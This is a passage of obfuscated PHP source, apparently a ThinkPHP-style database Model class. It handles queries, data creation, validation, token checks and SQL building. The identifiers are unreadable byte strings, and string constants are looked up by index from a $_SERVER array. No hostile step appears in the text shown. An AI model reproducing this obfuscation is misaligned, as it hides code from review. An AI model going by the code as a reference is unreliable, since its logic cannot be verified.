trim($¼œÎñ’Æ); if (in_array($¼œÎñ’Æ, $¹¶Œº¥ò, !0)) { if (is_scalar($ÀÊëí«º)) { $this->_parseType($²âÈ…Ò¯[$ä¦„İÄ”[354]], $¼œÎñ’Æ); } } elseif (!is_numeric($¼œÎñ’Æ) && $ä¦„İÄ”[11] != substr($¼œÎñ’Æ, 0, 1) && !1 === strpos($¼œÎñ’Æ, $ä¦„İÄ”[10]) && !1 === strpos($¼œÎñ’Æ, $ä¦„İÄ”[338]) && !1 === strpos($¼œÎñ’Æ, $ä¦„İÄ”[213]) && !1 === strpos($¼œÎñ’Æ, $ä¦„İÄ”[285])) { unset($²âÈ…Ò¯[$ä¦„İÄ”[354]][$¼œÎñ’Æ]); } } } $this->_options_filter($²âÈ…Ò¯); return $²âÈ…Ò¯; } protected function _options_filter(&$ ê ÑŠ) { } protected function _parseType(&$‘œæÁñ©, $Î›çÄòÏ) { $ë‹œ¦Ï¢ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($this->options[$ë‹œ¦Ï¢[362]][$ë‹œ¦Ï¢[4] . $Î›çÄòÏ])) { $®§¨ŞÄÃ = strtolower($this->fields[$ë‹œ¦Ï¢[330]][$Î›çÄòÏ]); if (!1 !== strpos($®§¨ŞÄÃ, $ë‹œ¦Ï¢[363])) { } elseif (!1 === strpos($®§¨ŞÄÃ, $ë‹œ¦Ï¢[364]) && !1 !== strpos($®§¨ŞÄÃ, $ë‹œ¦Ï¢[365])) { $‘œæÁñ©[$Î›çÄòÏ] = intval($‘œæÁñ©[$Î›çÄòÏ]); } elseif (!1 !== strpos($®§¨ŞÄÃ, $ë‹œ¦Ï¢[366]) || !1 !== strpos($®§¨ŞÄÃ, $ë‹œ¦Ï¢[367])) { $‘œæÁñ©[$Î›çÄòÏ] = floatval($‘œæÁñ©[$Î›çÄòÏ]); } elseif (!1 !== strpos($®§¨ŞÄÃ, $ë‹œ¦Ï¢[368])) { $‘œæÁñ©[$Î›çÄòÏ] = (bool) $‘œæÁñ©[$Î›çÄòÏ]; } } } public function find($ÉçÓò¹– = array()) { $Ğ®¼¡³ù =& $_SERVER[¿ÈˆÑ¸ä]; if (is_numeric($ÉçÓò¹–) || is_string($ÉçÓò¹–)) { $‚û©Èâ[$this->getPk()] = intval($ÉçÓò¹–); $this->options[$Ğ®¼¡³ù[354]] = $‚û©Èâ; } $this->options[$Ğ®¼¡³ù[369]] = 1; $ÉçÓò¹– = $this->_parseOptions(); $£İÕßÕÍ = $this->db->select($ÉçÓò¹–); if (!1 === $£İÕßÕÍ) { return !1; } if (empty($£İÕßÕÍ)) { return null; } $êİ¿‚÷ = $£İÕßÕÍ[0]; $this->_afterFind($êİ¿‚÷, $ÉçÓò¹–); return $êİ¿‚÷; } protected function _afterFind(&$”â¥ÅæÓ, $¦“‡»ê²) { } protected function returnResult($ÃªüĞ¸ñ, $à…ñ­ÁÙ = '') { $’àºÎ³ê =& $_SERVER[¿ÈˆÑ¸ä]; if ($à…ñ­ÁÙ) { if (is_callable($à…ñ­ÁÙ)) { return call_user_func($à…ñ­ÁÙ, $ÃªüĞ¸ñ); } switch (strtolower($à…ñ­ÁÙ)) { case $’àºÎ³ê[370]: return json_encode($ÃªüĞ¸ñ); case $’àºÎ³ê[371]: return xml_encode($ÃªüĞ¸ñ); } } return $ÃªüĞ¸ñ; } public function parseFieldsMap($õ»ƒˆÂ, $ù«ÌéÜ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $úü–ÅğÉ => $õ¡êÂ¾) { if ($ù«ÌéÜ == 1) { if (isset($õ»ƒˆÂ[$õ¡êÂ¾])) { $õ»ƒˆÂ[$úü–ÅğÉ] = $õ»ƒˆÂ[$õ¡êÂ¾]; unset($õ»ƒˆÂ[$õ¡êÂ¾]); } } else { if (isset($õ»ƒˆÂ[$úü–ÅğÉ])) { $õ»ƒˆÂ[$õ¡êÂ¾] = $õ»ƒˆÂ[$úü–ÅğÉ]; unset($õ»ƒˆÂ[$úü–ÅğÉ]); } } } } return $õ»ƒˆÂ; } public function setField($£¯Öã–†, $ß¦«ù²à = '') { if (is_array($£¯Öã–†)) { $¿­ù—ï¼ = $£¯Öã–†; } else { $¿­ù—ï¼[$£¯Öã–†] = $ß¦«ù²à; } return $this->save($¿­ù—ï¼); } public function setAdd($çÚ”à–ô, $®ÒÙÖÜ = 1) { $Ë­¡÷ã¾ =& $_SERVER[¿ÈˆÑ¸ä]; $Ú³ñÛÉ‡ = $çÚ”à–ô . $Ë­¡÷ã¾[372] . $®ÒÙÖÜ; if ($®ÒÙÖÜ < 0) { $Ú³ñÛÉ‡ = $çÚ”à–ô . $®ÒÙÖÜ; } return $this->setField($çÚ”à–ô, array($Ë­¡÷ã¾[373], $Ú³ñÛÉ‡)); } public function getField($ “ç²è«, $°¦şäš = null) { $ş˜ø´–© =& $_SERVER[¿ÈˆÑ¸ä]; $ÊıíáŸ†[$ş˜ø´–©[352]] = $ “ç²è«; $ÊıíáŸ† = $this->_parseOptions($ÊıíáŸ†); $ “ç²è« = trim($ “ç²è«); if (strpos($ “ç²è«, $ş˜ø´–©[50])) { if (!isset($ÊıíáŸ†[$ş˜ø´–©[369]])) { $ÊıíáŸ†[$ş˜ø´–©[369]] = is_numeric($°¦şäš) ? $°¦şäš : $ş˜ø´–©[12]; } $ùÒÔú… = $this->db->select($ÊıíáŸ†); if (!empty($ùÒÔú…)) { $ÓÜö½ùÖ = explode($ş˜ø´–©[50], $ “ç²è«); $ “ç²è« = array_keys($ùÒÔú…[0]); $Ş‰¨àÃ = array_shift($ “ç²è«); $İ§Ë—Û = array_shift($ “ç²è«); $ú¹İ„–˜ = array(); $Á¿Œ = count($ÓÜö½ùÖ); foreach ($ùÒÔú… as $¦öö©) { $˜‰¬±Ø‹ = $¦öö©[$Ş‰¨àÃ]; if (2 == $Á¿Œ) { $ú¹İ„–˜[$˜‰¬±Ø‹] = $¦öö©[$İ§Ë—Û]; } else { $ú¹İ„–˜[$˜‰¬±Ø‹] = is_string($°¦şäš) ? implode($°¦şäš, $¦öö©) : $¦öö©; } } return $ú¹İ„–˜; } } else { if (!0 !== $°¦şäš) { $ÊıíáŸ†[$ş˜ø´–©[369]] = is_numeric($°¦şäš) ? $°¦şäš : 1; } if ($°¦şäš === $ş˜ø´–©[333]) { unset($ÊıíáŸ†[$ş˜ø´–©[369]]); } $¦öö© = $this->db->select($ÊıíáŸ†); if (!empty($¦öö©)) { if ($°¦şäš === $ş˜ø´–©[333]) { return reset($¦öö©[0]); } if (!0 !== $°¦şäš && 1 == $ÊıíáŸ†[$ş˜ø´–©[369]]) { return reset($¦öö©[0]); } foreach ($¦öö© as $ü”¿ÇıÖ) { $¯èÉıïù[] = $ü”¿ÇıÖ[$ “ç²è«]; } return $¯èÉıïù; } } return null; } public function create($ü¥º ¿ = '', $×ú»œôÇ = '') { $ã›Ìßì¹ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($ü¥º ¿)) { $ü¥º ¿ = $_POST; } elseif (is_object($ü¥º ¿)) { $ü¥º ¿ = get_object_vars($ü¥º ¿); } if (empty($ü¥º ¿) || !is_array($ü¥º ¿)) { $this->error = think_lang($ã›Ìßì¹[350]); return !1; } $ü¥º ¿ = $this->parseFieldsMap($ü¥º ¿, 0); $×ú»œôÇ = $×ú»œôÇ ? $×ú»œôÇ : (!empty($ü¥º ¿[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ã›Ìßì¹[352]])) { $”£ûÑ¿Ó = $this->options[$ã›Ìßì¹[352]]; unset($this->options[$ã›Ìßì¹[352]]); } elseif ($×ú»œôÇ == THINK_MODEL_INSERT && isset($this->insertFields)) { $”£ûÑ¿Ó = $this->insertFields; } elseif ($×ú»œôÇ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $”£ûÑ¿Ó = $this->updateFields; } if (isset($”£ûÑ¿Ó)) { if (is_string($”£ûÑ¿Ó)) { $”£ûÑ¿Ó = explode($ã›Ìßì¹[50], $”£ûÑ¿Ó); } if (think_config($ã›Ìßì¹[374])) { $”£ûÑ¿Ó[] = think_config($ã›Ìßì¹[375]); } foreach ($ü¥º ¿ as $šòÑúÂË => $ÉëÎƒãÕ) { if (!in_array($šòÑúÂË, $”£ûÑ¿Ó)) { unset($ü¥º ¿[$šòÑúÂË]); } } } if (!$this->autoValidation($ü¥º ¿, $×ú»œôÇ)) { return !1; } if (!$this->autoCheckToken($ü¥º ¿)) { $this->error = think_lang($ã›Ìßì¹[376]); return !1; } if ($this->autoCheckFields) { $”£ûÑ¿Ó = $this->getDbFields(); foreach ($ü¥º ¿ as $šòÑúÂË => $ÉëÎƒãÕ) { if (!in_array($šòÑúÂË, $”£ûÑ¿Ó)) { unset($ü¥º ¿[$šòÑúÂË]); } elseif (MAGIC_QUOTES_GPC && is_string($ÉëÎƒãÕ)) { $ü¥º ¿[$šòÑúÂË] = stripslashes($ÉëÎƒãÕ); } } } $this->autoOperation($ü¥º ¿, $×ú»œôÇ); $this->data = $ü¥º ¿; return $ü¥º ¿; } public function autoCheckToken($“³¬Íš) { $¡ıÜÅ”è =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($this->options[$¡ıÜÅ”è[377]]) && !$this->options[$¡ıÜÅ”è[377]]) { return !0; } if (think_config($¡ıÜÅ”è[374])) { $ÆŠëÆÑ› = think_config($¡ıÜÅ”è[375]); if (!isset($“³¬Íš[$ÆŠëÆÑ›]) || Session::get($ÆŠëÆÑ›)) { return !1; } list($¾¿Úúî, $Ù®·ùĞ—) = explode($¡ıÜÅ”è[11], $“³¬Íš[$ÆŠëÆÑ›]); if ($Ù®·ùĞ— && Session::get($ÆŠëÆÑ› . $¡ıÜÅ”è[10] . $¾¿Úúî) === $Ù®·ùĞ—) { Session::remove($ÆŠëÆÑ› . $¡ıÜÅ”è[10] . $¾¿Úúî); return !0; } if (think_config($¡ıÜÅ”è[378])) { Session::remove($ÆŠëÆÑ› . $¡ıÜÅ”è[10] . $¾¿Úúî); } return !1; } return !0; } public function regex($õæøô¦³, $Ñ£õÌÀ) { $Ğï“ÚæÆ =& $_SERVER[¿ÈˆÑ¸ä]; $Éüßãá = array($Ğï“ÚæÆ[379] => $Ğï“ÚæÆ[380], $Ğï“ÚæÆ[381] => $Ğï“ÚæÆ[382], $Ğï“ÚæÆ[383] => $Ğï“ÚæÆ[384], $Ğï“ÚæÆ[385] => $Ğï“ÚæÆ[386], $Ğï“ÚæÆ[387] => $Ğï“ÚæÆ[388], $Ğï“ÚæÆ[389] => $Ğï“ÚæÆ[390], $Ğï“ÚæÆ[391] => $Ğï“ÚæÆ[392], $Ğï“ÚæÆ[367] => $Ğï“ÚæÆ[393], $Ğï“ÚæÆ[394] => $Ğï“ÚæÆ[395]); if (isset($Éüßãá[strtolower($Ñ£õÌÀ)])) { $Ñ£õÌÀ = $Éüßãá[strtolower($Ñ£õÌÀ)]; } return preg_match($Ñ£õÌÀ, $õæøô¦³) === 1; } private function autoOperation(&$ñ–ÏÄó, $«¦÷§±Á) { $É²¢‹ =& $_SERVER[¿ÈˆÑ¸ä]; if (!empty($this->options[$É²¢‹[396]])) { $é½î…–Ø = $this->options[$É²¢‹[396]]; unset($this->options[$É²¢‹[396]]); } elseif (!empty($this->_auto)) { $é½î…–Ø = $this->_auto; } if (isset($é½î…–Ø)) { foreach ($é½î…–Ø as $‡Ä§äúÁ) { if (empty($‡Ä§äúÁ[2])) { $‡Ä§äúÁ[2] = THINK_MODEL_INSERT; } if ($«¦÷§±Á == $‡Ä§äúÁ[2] || $‡Ä§äúÁ[2] == THINK_MODEL_BOTH) { switch (trim($‡Ä§äúÁ[3])) { case $É²¢‹[397]: case $É²¢‹[398]: $È¬´«‚í = isset($‡Ä§äúÁ[4]) ? (array) $‡Ä§äúÁ[4] : array(); if (isset($ñ–ÏÄó[$‡Ä§äúÁ[0]])) { array_unshift($È¬´«‚í, $ñ–ÏÄó[$‡Ä§äúÁ[0]]); } if ($É²¢‹[397] == $‡Ä§äúÁ[3]) { $ñ–ÏÄó[$‡Ä§äúÁ[0]] = call_user_func_array($‡Ä§äúÁ[1], $È¬´«‚í); } else { $ñ–ÏÄó[$‡Ä§äúÁ[0]] = call_user_func_array(array(&$this, $‡Ä§äúÁ[1]), $È¬´«‚í); } break; case $É²¢‹[352]: $ñ–ÏÄó[$‡Ä§äúÁ[0]] = $ñ–ÏÄó[$‡Ä§äúÁ[1]]; break; case $É²¢‹[399]: if ($É²¢‹[12] === $ñ–ÏÄó[$‡Ä§äúÁ[0]]) { unset($ñ–ÏÄó[$‡Ä§äúÁ[0]]); } break; case $É²¢‹[400]: default: $ñ–ÏÄó[$‡Ä§äúÁ[0]] = $‡Ä§äúÁ[1]; } if (!1 === $ñ–ÏÄó[$‡Ä§äúÁ[0]]) { unset($ñ–ÏÄó[$‡Ä§äúÁ[0]]); } } } } return $ñ–ÏÄó; } protected function autoValidation($• ¥˜, $­ÛùÖ¦¼) { $šˆ®¤Ğ± =& $_SERVER[¿ÈˆÑ¸ä]; if (!empty($this->options[$šˆ®¤Ğ±[401]])) { $ÄÒñÚÊŠ = $this->options[$šˆ®¤Ğ±[401]]; unset($this->options[$šˆ®¤Ğ±[401]]); } elseif (!empty($this->_validate)) { $ÄÒñÚÊŠ = $this->_validate; } if (isset($ÄÒñÚÊŠ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÄÒñÚÊŠ as $–ŸÆÂ³œ => $åıèÃ×ˆ) { if (empty($åıèÃ×ˆ[5]) || $åıèÃ×ˆ[5] == THINK_MODEL_BOTH || $åıèÃ×ˆ[5] == $­ÛùÖ¦¼) { if (0 == strpos($åıèÃ×ˆ[2], $šˆ®¤Ğ±[402]) && strpos($åıèÃ×ˆ[2], $šˆ®¤Ğ±[403])) { $åıèÃ×ˆ[2] = think_lang(substr($åıèÃ×ˆ[2], 2, -1)); } $åıèÃ×ˆ[3] = isset($åıèÃ×ˆ[3]) ? $åıèÃ×ˆ[3] : THINK_EXISTS_VALIDATE; $åıèÃ×ˆ[4] = isset($åıèÃ×ˆ[4]) ? $åıèÃ×ˆ[4] : $šˆ®¤Ğ±[404]; switch ($åıèÃ×ˆ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($• ¥˜, $åıèÃ×ˆ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($šˆ®¤Ğ±[12] != trim($• ¥˜[$åıèÃ×ˆ[0]])) { if (!1 === $this->_validationField($• ¥˜, $åıèÃ×ˆ)) { return !1; } } break; default: if (isset($• ¥˜[$åıèÃ×ˆ[0]])) { if (!1 === $this->_validationField($• ¥˜, $åıèÃ×ˆ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($òœã¨³Œ, $ÕÓíŸ«È) { if (!1 === $this->_validationFieldItem($òœã¨³Œ, $ÕÓíŸ«È)) { if ($this->patchValidate) { $this->error[$ÕÓíŸ«È[0]] = $ÕÓíŸ«È[2]; } else { $this->error = $ÕÓíŸ«È[2]; return !1; } } return; } protected function _validationFieldItem($á›ÌòŒ, $¼²¶“ØÒ) { $¡º€Ó¸ =& $_SERVER[¿ÈˆÑ¸ä]; switch (strtolower(trim($¼²¶“ØÒ[4]))) { case $¡º€Ó¸[397]: case $¡º€Ó¸[398]: $Í™ÅÓ†ç = isset($¼²¶“ØÒ[6]) ? (array) $¼²¶“ØÒ[6] : array(); if (is_string($¼²¶“ØÒ[0]) && strpos($¼²¶“ØÒ[0], $¡º€Ó¸[50])) { $¼²¶“ØÒ[0] = explode($¡º€Ó¸[50], $¼²¶“ØÒ[0]); } if (is_array($¼²¶“ØÒ[0])) { foreach ($¼²¶“ØÒ[0] as $©€ş’) { $‡†¡¹²ô[$©€ş’] = $á›ÌòŒ[$©€ş’]; } array_unshift($Í™ÅÓ†ç, $‡†¡¹²ô); } else { array_unshift($Í™ÅÓ†ç, $á›ÌòŒ[$¼²¶“ØÒ[0]]); } if ($¡º€Ó¸[397] == $¼²¶“ØÒ[4]) { return call_user_func_array($¼²¶“ØÒ[1], $Í™ÅÓ†ç); } else { return call_user_func_array(array(&$this, $¼²¶“ØÒ[1]), $Í™ÅÓ†ç); } case $¡º€Ó¸[405]: return $á›ÌòŒ[$¼²¶“ØÒ[0]] == $á›ÌòŒ[$¼²¶“ØÒ[1]]; case $¡º€Ó¸[406]: if (is_string($¼²¶“ØÒ[0]) && strpos($¼²¶“ØÒ[0], $¡º€Ó¸[50])) { $¼²¶“ØÒ[0] = explode($¡º€Ó¸[50], $¼²¶“ØÒ[0]); } $ÀÓ„–Ÿ = array(); if (is_array($¼²¶“ØÒ[0])) { foreach ($¼²¶“ØÒ[0] as $©€ş’) { $ÀÓ„–Ÿ[$©€ş’] = $á›ÌòŒ[$©€ş’]; } } else { $ÀÓ„–Ÿ[$¼²¶“ØÒ[0]] = $á›ÌòŒ[$¼²¶“ØÒ[0]]; } if (!empty($á›ÌòŒ[$this->getPk()])) { $ÀÓ„–Ÿ[$this->getPk()] = array($¡º€Ó¸[407], $á›ÌòŒ[$this->getPk()]); } if ($this->where($ÀÓ„–Ÿ)->find()) { return !1; } return !0; default: return $this->check($á›ÌòŒ[$¼²¶“ØÒ[0]], $¼²¶“ØÒ[1], $¼²¶“ØÒ[4]); } } public function check($ˆúÂÃÊ¯, $çò­›’, $ÖúùäÈã = "\x72\x65\147\x65\170") { $¯±„Ó«† =& $_SERVER[¿ÈˆÑ¸ä]; $ÖúùäÈã = strtolower(trim($ÖúùäÈã)); switch ($ÖúùäÈã) { case $¯±„Ó«†[7]: case $¯±„Ó«†[408]: $˜ãÙ˜¶† = is_array($çò­›’) ? $çò­›’ : explode($¯±„Ó«†[50], $çò­›’); return $ÖúùäÈã == $¯±„Ó«†[7] ? in_array($ˆúÂÃÊ¯, $˜ãÙ˜¶†) : !in_array($ˆúÂÃÊ¯, $˜ãÙ˜¶†); case $¯±„Ó«†[409]: case $¯±„Ó«†[410]: if (is_array($çò­›’)) { $›—Ì¸ê‹ = $çò­›’[0]; $¢‰Ä„— = $çò­›’[1]; } else { list($›—Ì¸ê‹, $¢‰Ä„—) = explode($¯±„Ó«†[50], $çò­›’); } return $ÖúùäÈã == $¯±„Ó«†[409] ? $ˆúÂÃÊ¯ >= $›—Ì¸ê‹ && $ˆúÂÃÊ¯ <= $¢‰Ä„— : $ˆúÂÃÊ¯ < $›—Ì¸ê‹ || $ˆúÂÃÊ¯ > $¢‰Ä„—; case $¯±„Ó«†[411]: case $¯±„Ó«†[412]: return $ÖúùäÈã == $¯±„Ó«†[411] ? $ˆúÂÃÊ¯ == $çò­›’ : $ˆúÂÃÊ¯ != $çò­›’; case $¯±„Ó«†[413]: $†¯¡›¢í = mb_strlen($ˆúÂÃÊ¯, $¯±„Ó«†[414]); if (strpos($çò­›’, $¯±„Ó«†[50])) { list($›—Ì¸ê‹, $¢‰Ä„—) = explode($¯±„Ó«†[50], $çò­›’); return $†¯¡›¢í >= $›—Ì¸ê‹ && $†¯¡›¢í <= $¢‰Ä„—; } else { return $†¯¡›¢í == $çò­›’; } case $¯±„Ó«†[415]: list($Æœæî, $Â İŞö˜) = explode($¯±„Ó«†[50], $çò­›’); if (!is_numeric($Æœæî)) { $Æœæî = strtotime($Æœæî); } if (!is_numeric($Â İŞö˜)) { $Â İŞö˜ = strtotime($Â İŞö˜); } return NOW_TIME >= $Æœæî && NOW_TIME <= $Â İŞö˜; case $¯±„Ó«†[416]: return in_array(get_client_ip(), explode($¯±„Ó«†[50], $çò­›’)); case $¯±„Ó«†[417]: return !in_array(get_client_ip(), explode($¯±„Ó«†[50], $çò­›’)); case $¯±„Ó«†[404]: default: return $this->regex($ˆúÂÃÊ¯, $çò­›’); } } public function query($¸Ş£ËÇ, $Ï¦ô‰ß‚ = false) { $ùïÓö’À =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_bool($Ï¦ô‰ß‚) && !is_array($Ï¦ô‰ß‚)) { $Ï¦ô‰ß‚ = func_get_args(); array_shift($Ï¦ô‰ß‚); } $¸Ş£ËÇ = str_replace(array($ùïÓö’À[286], $ùïÓö’À[418]), $ùïÓö’À[53], $¸Ş£ËÇ); $¸Ş£ËÇ = $this->parseSql($¸Ş£ËÇ, $Ï¦ô‰ß‚); return $this->db->query($¸Ş£ËÇ); } public function execute($šøÃß×Í, $‡·›¸ì‰ = false) { if (!is_bool($‡·›¸ì‰) && !is_array($‡·›¸ì‰)) { $‡·›¸ì‰ = func_get_args(); array_shift($‡·›¸ì‰); } $šøÃß×Í = $this->parseSql($šøÃß×Í, $‡·›¸ì‰); return $this->db->execute($šøÃß×Í); } protected function parseSql($”Õ²®ˆ³, $ïã—óÓ¯) { $éµ·‹ =& $_SERVER[¿ÈˆÑ¸ä]; if (!0 === $ïã—óÓ¯) { $ÉşäÀƒ  = $this->_parseOptions(); $”Õ²®ˆ³ = $this->db->parseSql($”Õ²®ˆ³, $ÉşäÀƒ ); } elseif (is_array($ïã—óÓ¯)) { $ïã—óÓ¯ = array_map(array($this->db, $éµ·‹[419]), $ïã—óÓ¯); $”Õ²®ˆ³ = vsprintf($”Õ²®ˆ³, $ïã—óÓ¯); } else { $”Õ²®ˆ³ = strtr($”Õ²®ˆ³, array($éµ·‹[420] => $this->getTableName(), $éµ·‹[421] => think_config($éµ·‹[322]))); } $this->db->setModel($this->name); return $”Õ²®ˆ³; } public function db($şµßßŞš = '', $×¿ôÚ©’ = '', $˜»‹—ûê = array()) { $ì™à¬œ =& $_SERVER[¿ÈˆÑ¸ä]; if ($ì™à¬œ[12] === $şµßßŞš && $this->db) { return $this->db; } static $…Úˆê¶¨ = array(); static $×Ö—ì = array(); if (!isset($×Ö—ì[$şµßßŞš]) || isset($×Ö—ì[$şµßßŞš]) && $×¿ôÚ©’ && $…Úˆê¶¨[$şµßßŞš] != $×¿ôÚ©’) { if (!empty($×¿ôÚ©’) && is_string($×¿ôÚ©’) && !1 === strpos($×¿ôÚ©’, $ì™à¬œ[8])) { $×¿ôÚ©’ = think_config($×¿ôÚ©’); } $şµßßŞš = think_guid($×¿ôÚ©’); $×Ö—ì[$şµßßŞš] = Db::getInstance($×¿ôÚ©’); } elseif (NULL === $×¿ôÚ©’) { $×Ö—ì[$şµßßŞš]->close(); unset($×Ö—ì[$şµßßŞš]); return; } if (!empty($˜»‹—ûê)) { if (is_string($˜»‹—ûê)) { parse_str($˜»‹—ûê, $˜»‹—ûê); } foreach ($˜»‹—ûê as $ş¼ŠÊ‚ç => $·ĞöÃıŒ) { $this->setProperty($ş¼ŠÊ‚ç, $·ĞöÃıŒ); } } $…Úˆê¶¨[$şµßßŞš] = $×¿ôÚ©’; $this->db = $×Ö—ì[$şµßßŞš]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ùß»šÕˆ = get_class($this); if ($Ùß»šÕˆ == $_SERVER[¿ÈˆÑ¸ä][422]) { return $this->name; } $this->name = substr($Ùß»šÕˆ, 0, -5); } return $this->name; } public function getTableName() { $ÏÂÁû ‡ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($this->trueTableName)) { $ÅöÉÒß¢ = !empty($this->tablePrefix) ? $this->tablePrefix : $ÏÂÁû ‡[12]; if (!empty($this->tableName)) { $ÅöÉÒß¢ .= $this->tableName; } else { $ÅöÉÒß¢ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÅöÉÒß¢); } return (!empty($this->dbName) ? $this->dbName . $ÏÂÁû ‡[10] : $ÏÂÁû ‡[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ßüÂí½ù =& $_SERVER[¿ÈˆÑ¸ä]; return isset($this->fields[$ßüÂí½ù[329]]) ? $this->fields[$ßüÂí½ù[329]] : $this->pk; } public function getDbFields() { $­ë·˜ÔŸ =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($this->options[$­ë·˜ÔŸ[358]])) { $ÂÓ®â³ = $this->db->getFields($this->options[$­ë·˜ÔŸ[358]]); return $ÂÓ®â³ ? array_keys($ÂÓ®â³) : !1; } if ($this->fields) { $ÂÓ®â³ = $this->fields; unset($ÂÓ®â³[$­ë·˜ÔŸ[328]], $ÂÓ®â³[$­ë·˜ÔŸ[329]], $ÂÓ®â³[$­ë·˜ÔŸ[330]], $ÂÓ®â³[$­ë·˜ÔŸ[327]]); return $ÂÓ®â³; } return !1; } public function data($‰÷±— = '') { $ ü™Øâ =& $_SERVER[¿ÈˆÑ¸ä]; if ($ ü™Øâ[12] === $‰÷±— && !empty($this->data)) { return $this->data; } if (is_object($‰÷±—)) { $‰÷±— = get_object_vars($‰÷±—); } elseif (is_string($‰÷±—)) { parse_str($‰÷±—, $‰÷±—); } elseif (!is_array($‰÷±—)) { think_exception(think_lang($ ü™Øâ[350])); } $this->data = $‰÷±—; return $this; } public function join($¦¨§½ò) { $ ğ¹ù„ =& $_SERVER[¿ÈˆÑ¸ä]; if (is_array($¦¨§½ò)) { $this->options[$ ğ¹ù„[361]] = $¦¨§½ò; } elseif (!empty($¦¨§½ò)) { $this->options[$ ğ¹ù„[361]][] = $¦¨§½ò; } return $this; } public function union($¨­ Ö„ú, $¥±ĞæŒ² = false) { $÷Æôïğ¾ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($¨­ Ö„ú)) { return $this; } if ($¥±ĞæŒ²) { $this->options[$÷Æôïğ¾[423]][$÷Æôïğ¾[424]] = !0; } if (is_object($¨­ Ö„ú)) { $¨­ Ö„ú = get_object_vars($¨­ Ö„ú); } if (is_string($¨­ Ö„ú)) { $§Ó’Ç¿á = $¨­ Ö„ú; } elseif (is_array($¨­ Ö„ú)) { if (isset($¨­ Ö„ú[0])) { $this->options[$÷Æôïğ¾[423]] = array_merge($this->options[$÷Æôïğ¾[423]], $¨­ Ö„ú); return $this; } else { $§Ó’Ç¿á = $¨­ Ö„ú; } } else { think_exception(think_lang($÷Æôïğ¾[350])); } $this->options[$÷Æôïğ¾[423]][] = $§Ó’Ç¿á; return $this; } public function cache($‘–Û…½Á = true, $±’ªºêå = null, $ô©¬Üşš = '') { $èèŞÜÑÕ =& $_SERVER[¿ÈˆÑ¸ä]; if (!1 !== $‘–Û…½Á) { $this->options[$èèŞÜÑÕ[425]] = array($èèŞÜÑÕ[95] => $‘–Û…½Á, $èèŞÜÑÕ[415] => $±’ªºêå, $èèŞÜÑÕ[33] => $ô©¬Üşš); } return $this; } public function field($şÅùãßØ, $ÒÎâœ®ñ = false) { $ûØìßÎÂ =& $_SERVER[¿ÈˆÑ¸ä]; if (!0 === $şÅùãßØ) { $Ÿùù¡¢¥ = $this->getDbFields(); $şÅùãßØ = $Ÿùù¡¢¥ ? $Ÿùù¡¢¥ : $ûØìßÎÂ[221]; } elseif ($ÒÎâœ®ñ) { if (is_string($şÅùãßØ)) { $şÅùãßØ = explode($ûØìßÎÂ[50], $şÅùãßØ); } $Ÿùù¡¢¥ = $this->getDbFields(); $şÅùãßØ = $Ÿùù¡¢¥ ? array_diff($Ÿùù¡¢¥, $şÅùãßØ) : $şÅùãßØ; } $this->options[$ûØìßÎÂ[352]] = $şÅùãßØ; return $this; } public function scope($´½—ÃñÁ = '', $½›ãŸ = NULL) { $‹âèÊøß =& $_SERVER[¿ÈˆÑ¸ä]; if ($‹âèÊøß[12] === $´½—ÃñÁ) { if (isset($this->_scope[$‹âèÊøß[37]])) { $ÖšèØş = $this->_scope[$‹âèÊøß[37]]; } else { return $this; } } elseif (is_string($´½—ÃñÁ)) { $ÕÃÔõ«Ô = explode($‹âèÊøß[50], $´½—ÃñÁ); $ÖšèØş = array(); foreach ($ÕÃÔõ«Ô as $’¥¡ËŞö) { if (!isset($this->_scope[$’¥¡ËŞö])) { continue; } $ÖšèØş = array_merge($ÖšèØş, $this->_scope[$’¥¡ËŞö]); } if (!empty($½›ãŸ) && is_array($½›ãŸ)) { $ÖšèØş = array_merge($ÖšèØş, $½›ãŸ); } } elseif (is_array($´½—ÃñÁ)) { $ÖšèØş = $´½—ÃñÁ; } if (is_array($ÖšèØş) && !empty($ÖšèØş)) { $this->options = array_merge($this->options, array_change_key_case($ÖšèØş)); } return $this; } public function where($İú¿×ÂÍ, $…¼‹âÍ» = null) { $ŸÈ­Û£Õ =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_null($…¼‹âÍ») && is_string($İú¿×ÂÍ)) { if (!is_array($…¼‹âÍ»)) { $…¼‹âÍ» = func_get_args(); array_shift($…¼‹âÍ»); } $…¼‹âÍ» = array_map(array($this->db, $ŸÈ­Û£Õ[419]), $…¼‹âÍ»); $İú¿×ÂÍ = vsprintf($İú¿×ÂÍ, $…¼‹âÍ»); } elseif (is_object($İú¿×ÂÍ)) { $İú¿×ÂÍ = get_object_vars($İú¿×ÂÍ); } elseif (is_array($İú¿×ÂÍ)) { foreach ($İú¿×ÂÍ as $ı˜¨ëÌ˜ => $²ªúº—Ö) { if ((is_numeric($ı˜¨ëÌ˜) || !$ı˜¨ëÌ˜) && is_string($²ªúº—Ö)) { if (strpos($²ªúº—Ö, $ŸÈ­Û£Õ[426]) === 0) { continue; } think_trace($ŸÈ­Û£Õ[427], $ŸÈ­Û£Õ[12], $ŸÈ­Û£Õ[49]); die; } } } if (is_string($İú¿×ÂÍ) && $ŸÈ­Û£Õ[12] != $İú¿×ÂÍ) { 